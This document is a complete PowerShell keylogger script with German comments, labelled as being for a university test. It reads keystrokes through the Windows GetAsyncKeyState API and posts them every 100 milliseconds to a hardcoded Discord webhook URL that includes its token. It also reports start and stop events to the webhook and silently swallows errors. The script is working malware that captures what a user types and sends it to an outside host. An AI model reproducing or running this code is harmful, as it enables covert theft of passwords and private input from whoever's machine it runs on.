# PowerShell Keylogger & Discord-Webhook-Sender mit Timeout (z.B. für Uni-Test)
Add-Type -AssemblyName System.Windows.Forms
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Keyboard
{
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
}
"@

$hookUrl = "https://discord.com/api/webhooks/1433072215401824358/f95HWyiUinYpyysS0MA7NUuSPFs1Ute71SLQ0hEYYvebxsCoQam850qtTGwHRDbR2yg3"

# Zeitmessung beginnen
$start = Get-Date
$timeout = 120 # Sekunden
$lastSend = Get-Date
$buffer = ""


# Logger-Start an Discord melden
try {
    Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content="[Logger] gestartet: $(Get-Date -Format o)"}|ConvertTo-Json) -ContentType "application/json"
} catch {}

while ($true) {
    $elapsed = (Get-Date) - $start
    if ($elapsed.TotalSeconds -ge $timeout) {
        break
    }

    # Prüfe Leerzeichen
    if ([Keyboard]::GetAsyncKeyState(0x20) -eq -32767) {
        $buffer += " "
    }

    # Prüfe Buchstaben (A-Z)
    foreach ($vkey in 65..90) {
        if ([Keyboard]::GetAsyncKeyState($vkey) -eq -32767) {
            $shift = [Keyboard]::GetAsyncKeyState(0x10)
            $caps = [Console]::CapsLock
            $char = [char]$vkey
            if (!($shift -eq -32768 -xor $caps)) {

                $char = $char.ToString().ToLower()
            }
            $buffer += $char
        }
    }

    # Prüfe Zahlen (0-9)
    foreach ($vkey in 48..57) {
        if ([Keyboard]::GetAsyncKeyState($vkey) -eq -32767) {
            $buffer += [char]$vkey
        }
    }

    # Sende Buffer alle 100ms
    $now = Get-Date
    if ($buffer.Length -gt 0 -and ($now - $lastSend).TotalMilliseconds -ge 100) {
        try {
            Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content=$buffer}|ConvertTo-Json) -ContentType "application/json"
            $buffer = ""
            $lastSend = $now
        } catch {}
    }
}

# Sende restlichen Buffer
if ($buffer.Length -gt 0) {
    try {
        Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content=$buffer}|ConvertTo-Json) -ContentType "application/json"
    } catch {}
}

# Logger-Ende an Discord melden
try {
    Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content="[Logger] beendet: $(Get-Date -Format o)"}|ConvertTo-Json) -ContentType "application/json"
} catch {}